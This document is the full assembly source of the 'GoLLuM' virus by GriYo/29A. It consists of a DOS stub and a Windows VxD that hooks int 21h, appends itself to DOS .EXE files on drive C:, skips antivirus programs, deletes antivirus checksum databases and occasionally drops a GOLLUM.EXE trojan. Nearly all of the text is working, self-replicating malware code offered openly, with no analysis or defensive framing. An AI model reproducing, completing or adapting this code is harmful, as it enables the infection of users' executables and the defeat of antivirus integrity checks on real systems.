   ; - -[VXDSTUB.ASM - VxD stub used in trojans] - - - - - - - - - - - - - ->8

       name vxdstub
   _TEXT   segment word public 'CODE'
       assume cs:_TEXT,ds:_TEXT,es:_TEXT

   ;Activation routine
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   vxdstub proc far
       ;Segment regs!
       mov ax,cs
       mov ds,ax
       mov es,ax
       ;Set video mode 80x25x16c
       mov ax,0003h
       int 10h
       ;Print "Gollum!"
       mov ax,1301h
       mov bx,0002h
       mov cx,0007h
       mov dx,0A24h
       mov bp,offset Gollum_Says
       int 10h
       ;Endless loop
   Dead_Zone:
       ;Aaaarrrgggghhhhh!!!!
       jmp Dead_Zone

           ;Text printed on screen
   Gollum_Says     db "GoLLum!"

   vxdstub  endp

   _TEXT   ends
       end vxdstub

   ; - -[WGOLLUM.ASM - VxD virus code] - - - - - - - - - - - - - - - - - - ->8

   .386p
   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Includes                                                                ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   .XLIST
   INCLUDE Vmm.Inc
   INCLUDE SheLL.Inc
   .LIST

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virtual device declaration                                              ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   Declare_Virtual_Device WGoLLuM,03h,00h,WGoLLuM_Control,Undefined_Device_ID,,,

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Initialization data segment                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   VxD_IDATA_SEG

   VxD_Installation_Title  db "GoLLuM ViRuS by GriYo/29A",00h
   VxD_Installation_Msg    db "Deep down here by the dark water lived old "
               db "Gollum, a small slimy creature. I dont know "
               db "where he came from, nor who or what he was. "
               db "He was a Gollum -as dark as darkness, except "
               db "for two big round pale eyes in his thin face."
               db 0Dh,0Ah,0Dh,0Ah
               db "J.R.R. ToLkieN ... The HoBBit"
               db 0Dh,0Ah,0Dh,0Ah
               db 00h

   VxD_IDATA_ENDS

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Local locked data segment                                               ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   VxD_LOCKED_DATA_SEG

   Header_Size             equ 001Ch                ;Dos .EXE header size
   VxD_Size                equ 6592                 ;VxD file size
               ALIGN DWORD
   DOS_Virus_Code          equ this byte            ;Start of Dos virus code
               include gollum.inc       ;Load Dos virus code
   Header_Copy             db Header_Size dup (00h) ;Buffer for old .EXE header
   DOS_Virus_End           equ this byte
   DOS_Virus_Size          equ (DOS_Virus_End-DOS_Virus_Code)
   Our_Own_Call_Flag       db "EERF"                    ;Dos call from virus?
   File_Size               dd 00000000h                 ;Size of file to infect
   Start_FileName          dd 00000000h                 ;Filename start
   VxD_Buffer              db 0200h dup (00h)           ;VxD file copy
   Infect_FileName         db 80h dup (00h)             ;Last executed file
   File_Header             db Header_Size dup (00h)     ;Infected .EXE header
   VxD_File_Name           db 80h dup (00h)             ;Path of virus VxD
   Gollum_Name             db "GOLLUM.386",00h          ;Name of virus VxD file
   Trojan_File_Name        db "GOLLUM.EXE",00h          ;Generated trojans
   CheckSum_File_00:       db "ANTI-VIR.DAT",00h        ;Names of av databases
   CheckSum_File_01:       db "CHKLIST.TAV",00h
   CheckSum_File_02:       db "CHKLIST.MS",00h
   CheckSum_File_03:       db "AVP.CRC",00h
   CheckSum_File_04:       db "IVB.NTZ",00h
   Gollum_Handle           dw 0000h                     ;VxD file handle
   Victim_Handle           dw 0000h                     ;Victim file handle
   File_Attr               dw 0000h                     ;Victim file attr
   File_Time               dw 0000h                     ;Victim file time
   File_Date               dw 0000h                     ;Victim file date

   VxD_LOCKED_DATA_ENDS

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Initialization code segment                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   VxD_ICODE_SEG

   ;This is the virus startup code (Sys_Critical_Init)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   BeginProc WGoLLuM_Sys_Critical_Init

       ;Get path of WIN386.EXE
       VMMCall Get_Exec_Path
       ;Copy path to our buffer
       mov esi,edx
       mov edi,OFFSET32 VxD_File_Name
       cld
       rep movsb
       mov esi,OFFSET32 Gollum_Name
       mov ecx,0Bh
       cld
       rep movsb
       ;Return, Sys_Critical_Init complete
       clc
       ret

   EndProc WGoLLuM_Sys_Critical_Init

   ;This is the virus startup code (Device_Init)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   BeginProc WGoLLuM_Device_Init

       ;Hook int 21h so we can monitor dos file operations
       mov eax,21h
       mov esi,OFFSET32 VxD_Int_21h
       VMMcall Hook_V86_Int_Chain
       clc
       ret

   EndProc WGoLLuM_Device_Init

   ;This is the virus startup code (Init_Complete)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   BeginProc WGoLLuM_Init_Complete

       ;Check current date
       mov ah,04h
       VxDint 1Ah
       cmp dx,0604h
           jne short Not_Yet
       ;Display instalation msg
       VMMCall Get_SYS_VM_Handle
       xor eax,eax
       mov ecx,OFFSET32 VxD_Installation_Msg
       mov edi,OFFSET32 VxD_Installation_Title
       VxDcall Shell_SYSMODAL_Message
   Not_Yet:
       ;Return, Sys_Critical_Init complete
       clc
       ret

   EndProc WGoLLuM_Init_Complete

   VxD_ICODE_ENDS

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Locked code segment                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   VxD_LOCKED_CODE_SEG

   ;This is a call-back routine to handle the messages that are sent
   ;to VxD's to control system operation
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   BeginProc WGoLLuM_Control

           Control_Dispatch Sys_Critical_Init, WGoLLuM_Sys_Critical_Init
           Control_Dispatch Device_Init, WGoLLuM_Device_Init
           Control_Dispatch Init_Complete, WGoLLuM_Init_Complete
       clc
       ret

   EndProc WGoLLuM_Control

   ;This is the virus int 21h handler
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   BeginProc VxD_Int_21h, High_Freq

       ;Save regs
       pushad
       ;Check for our own calls (avoid recursive int 21h calls)
       cmp dword ptr [Our_Own_Call_Flag],"BUSY"
           je short Exit_VxD_Int_21h
       ;Set flag
       mov dword ptr [Our_Own_Call_Flag],"BUSY"
       ;Get called function
       mov ax,word ptr [ebp.Client_AX]
       ;Check for Exec function calls
       cmp ax,4B00h
           je short Store_FileName
       ;Check for Terminate with error-code 00h function calls
       cmp ax,4C00h
           je short Infect_Stored_FileName
       cmp ah,3Bh
       je Drop_Exe_Trojan
   Exit_VxD_Int_21h:
       ;Clear flag
       mov dword ptr [Our_Own_Call_Flag],"FREE"
       ;Restore regs
       popad
       ;Int not served yet
       stc
       ret

   ;Save file name for later infection
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Store_FileName:
       ;Save filename into our buffer
       movzx edx,word ptr [ebp.Client_DX]
       movzx eax,word ptr [ebp.Client_DS]
       shl eax,04h
       add eax,edx
       mov esi,eax
       mov edi,OFFSET32 Infect_FileName
   Go_Thru_Filename:
       cld
       lodsb
       stosb
       or al,al
       jnz Go_Thru_Filename
       jmp Exit_VxD_Int_21h

   ;Infect stored file name
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Infect_Stored_FileName:
       ;Check if working on C: drive
       mov esi,OFFSET32 Infect_FileName
       cmp word ptr [esi],":C"
       jne Infect_Error
   Look_End:
           ;Find null marker into filename
       cld
       lodsb
       or al,al
       jnz Look_End
   Found_Tail:
       ;Search begin of file name
       dec esi
       mov ecx,0080h
   Look_Start:
       std
       lodsb
       ;Do not infect files with V character in their names
       cmp al,"V"
       je Infect_Error
       ;Do not infect files with digit in their names
       cmp al,"0"
           jb short Check_Start
       cmp al,"9"
       jbe Infect_Error
   Check_Start:
       cmp al,"\"
           je short Check_Names
       loop Look_Start
       ;Begin of file name not found, tchhh...
       jmp Infect_Error
   Check_Names:
       inc esi
       inc esi
       ;Save pointer to file name start
       mov dword ptr [Start_FileName],esi
       cld
       lodsd
           ;Check for SCAN
       cmp eax,"NACS"
       je Infect_Error
       ;Check for F-PROT
       cmp eax,"RP-F"
       je Infect_Error
       ;Avoid THUNDERBYTE shit
       cmp ax,"BT"
       je Infect_Error
       ;Get file attr
       mov ax,4300h
       mov edx,OFFSET32 Infect_FileName
       VxDint 21h
       jc Infect_Error
       ;Save file attr
       mov word ptr [file_attr],cx
       ;Wipe out attr
       mov ax,4301h
       xor cx,cx
       VxDint 21h
       jc Infect_Error
       ;Open file to infect
       mov ax,3D02h
       mov edx,OFFSET32 Infect_FileName
       VxDint 21h
       jc Restore_Attr
       ;Get file handler
       mov word ptr [Victim_Handle],ax
       xchg bx,ax
       ;Get file date/time
       mov ax,5700h
       VxDint 21h
       jc Infect_Close
       ;Save file date time
       mov word ptr [File_Time],cx
       mov word ptr [File_Date],dx
       ;Read file header
       mov ah,3Fh
       mov ecx,Header_Size
       mov edx,OFFSET32 File_Header
       VxDint 21h
       jc Restore_Date_Time
       ;Seek to EOF and get real file size
       call Seek_File_End
       jc Restore_Date_Time
       ;Do not infect too small files
       cmp eax,DOS_Virus_Size+VxD_Size
       jbe Restore_Date_Time
   Test_EXE_File:
       ;Point esi to file header
       mov esi,OFFSET32 File_Header
       ;Check dos .EXE file type mark
       cmp word ptr [esi],"ZM"
       jne Restore_Date_Time
       ;Check if file is infected
       cmp word ptr [esi+12h],"CR"
       je Restore_Date_Time
       ;Don't infect Windows files or above
       cmp word ptr [esi+19h],0040h
       jae Restore_Date_Time
       ;Don't infect overlays
       cmp word ptr [esi+1Ah],0000h
       jne Restore_Date_Time
       ;Check maxmem field
       cmp word ptr [esi+0Ch],0FFFFh
       jne Restore_Date_Time
       ;Save entry point
       push eax
       mov eax,dword ptr [esi+14h]
       ;Crypt it!
       not eax
       mov dword ptr [DOS_Virus_Code+0177h],eax
       pop eax
       ;Make a copy of .exe file header
       push esi
       mov edi,OFFSET32 Header_Copy
       mov ecx,Header_Size
   Copy_Loop:
       cld
       lodsb
       not al
       stosb
       loop Copy_Loop
       pop esi
       ;Get file size into dx:ax
       mov eax,dword ptr [File_Size]
       mov edx,eax
       shr edx,10h
       ;Get file size div 10h
       mov cx,0010h
       div cx
       ;Sub header size
       sub ax,word ptr [esi+08h]
       ;New entry point at EOF
       mov word ptr [esi+14h],dx
       mov word ptr [esi+16h],ax
       ;Save delta offset
       mov word ptr [DOS_Virus_Code+0001h],dx
       ;Set new offset of stack segment in load module
       inc ax
       mov word ptr [esi+0Eh],ax
       ;Set new stack pointer beyond end of virus
       add dx,DOS_Virus_Size+VxD_Size+0200h
       ;Aligment
       and dx,0FFFEh
       mov word ptr [esi+10h],dx
       ;Get file size into dx:ax
       mov eax,dword ptr [File_Size]
       mov edx,eax
       shr edx,10h
       ;Get file size div 0200h
       mov cx,0200h
       div cx
       or dx,dx
           jz short Size_Round_1
       inc ax
   Size_Round_1:
       ;Check if file size is as header says
       cmp ax,word ptr [esi+04h]
       jne Restore_Date_Time
       cmp dx,word ptr [esi+02h]
       jne Restore_Date_Time
       ;Get file size into dx:ax
       mov eax,dword ptr [File_Size]
       mov edx,eax
       shr edx,10h
       ;Add virus size to file size
       add ax,DOS_Virus_Size+VxD_Size
       adc dx,0000h
       ;Get infected file size div 0200h
       mov cx,0200h
       div cx
       or dx,dx
           jz short Size_Round_2
       inc ax
   Size_Round_2:
       ;Store new size
       mov word ptr [esi+02h],dx
       mov word ptr [esi+04h],ax
       ;Write DOS virus area next to EOF
       mov ah,40h
       mov ecx,DOS_Virus_Size
       mov edx,OFFSET32 DOS_Virus_Code
       VxDint 21h
       jc Restore_Date_Time
       ;Open Gollum VxD file
       mov ax,3D00h
       mov edx,OFFSET32 VxD_File_Name
       VxDint 21h
       jc Restore_Date_Time
       ;Save file handler
       mov word ptr [Gollum_Handle],ax
   Read_VxD_Block:
       ;Read VxD file block
       mov ah,3Fh
       mov bx,word ptr [Gollum_Handle]
       mov ecx,0200h
       mov edx,OFFSET32 VxD_Buffer
       VxDint 21h
       push eax
       ;Encrypt block
       mov esi,edx
       mov edi,edx
       mov cx,0200h
   Crypt_Loop_3:
       cld
       lodsb
       not al
       stosb
       loop Crypt_Loop_3
       ;Write block
       pop ecx
       mov ah,40h
       mov bx,word ptr [Victim_Handle]
       VxDint 21h
       cmp cx,0200h
       je Read_VxD_Block
       ;Close file
       mov bx,word ptr [Gollum_Handle]
       mov ah,3Eh
       VxDint 21h
       ;Seek to beginning of file
       mov bx,word ptr [Victim_Handle]
       call Seek_File_Start
       ;Mark file as infected
       mov esi,OFFSET32 File_Header
       mov word ptr [esi+12h],"CR"
       ;Write new header
       mov ah,40h
       mov cx,Header_Size
       mov edx,esi
       VxDint 21h
       ;Delete ANTI-VIR.DAT
       mov esi,OFFSET32 CheckSum_File_00
       call Delete_File
       ;Delete CHKLIST.TAV
       mov esi,OFFSET32 CheckSum_File_01
       call Delete_File
       ;Delete CHKLIST.MS
       mov esi,OFFSET32 CheckSum_File_02
       call Delete_File
       ;Delete AVP.CRC
       mov esi,OFFSET32 CheckSum_File_03
       call Delete_File
       ;Delete IVB.NTZ
       mov esi,OFFSET32 CheckSum_File_04
       call Delete_File
   Restore_Date_Time:
       mov ax,5701h
       mov cx,word ptr [File_Time]
       mov dx,word ptr [File_Date]
       VxDint 21h
   Infect_Close:
       ;Close file
       mov ah,3Eh
       VxDint 21h
   Restore_Attr:
       ;Restore file attr
       mov ax,4301h
       mov cx,word ptr [File_Attr]
       mov edx,OFFSET32 Infect_FileName
       VxDint 21h
   Infect_Error:
       jmp Exit_VxD_Int_21h

   ;Drop a trojan .EXE file (sometimes)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   Drop_Exe_Trojan:
           ;This is our dice
       in ax,40h
       cmp al,0FFh
       jne Bad_OverWrite
       ;Open Gollum VxD file
       mov ax,3D00h
       mov edx,OFFSET32 VxD_File_Name
       VxDint 21h
       jc Bad_OverWrite
       ;Save file handler
       mov word ptr [Gollum_Handle],ax
       ;Create file, abort if exist
       mov ah,5Bh
       xor cx,cx
       mov edx,OFFSET32 Trojan_File_Name
       VxDint 21h
           jc short Bad_OverOpen
       ;Save file handler
       mov word ptr [Victim_Handle],ax
   Trojanize_Block:
       ;Read VxD file block
       mov ah,3Fh
       mov bx,word ptr [Gollum_Handle]
       mov ecx,0200h
       mov edx,OFFSET32 VxD_Buffer
       VxDint 21h
       ;Write block
       xchg ecx,eax
       mov ah,40h
       mov bx,word ptr [Victim_Handle]
       VxDint 21h
       cmp cx,0200h
       je Trojanize_Block
       ;Close trojan file
       mov ah,3Eh
       VxDint 21h
   Bad_OverOpen:
       ;Close virus VxD file
       mov bx,word ptr [Gollum_Handle]
       mov ah,3Eh
       VxDint 21h
   Bad_OverWrite:
       jmp Exit_VxD_Int_21h

   ;Delete file routines
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Delete_File:
       mov edi,dword ptr [Start_FileName]
   Copy_DB_Name:
       cld
       lodsb
       stosb
       or al,al
       jnz Copy_DB_Name
       ;Wipe out file attr
       mov ax,4301h
       xor ecx,ecx
       mov edx,OFFSET32 Infect_FileName
       VxDint 21h
       ;Delete filename
       mov ah,41h
       VxDint 21h
       ret

   ;Move file pointer routines (bx = file handle)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Seek_File_Start:
       xor al,al
       jmp SHORT Seek_Int_21h
   Seek_File_End:
       mov al,02h
   Seek_Int_21h:
       mov ah,42h
       xor cx,cx
       xor dx,dx
       VxDint 21h
           jc short Seek_Error
       ;Return file pointer position into eax
       and eax,0000FFFFh
       shl edx,10h
       add eax,edx
       mov dword ptr [File_Size],eax
       clc
       ret
   Seek_Error:
       stc
       ret

   EndProc VxD_Int_21h

   VxD_LOCKED_CODE_ENDS

       END
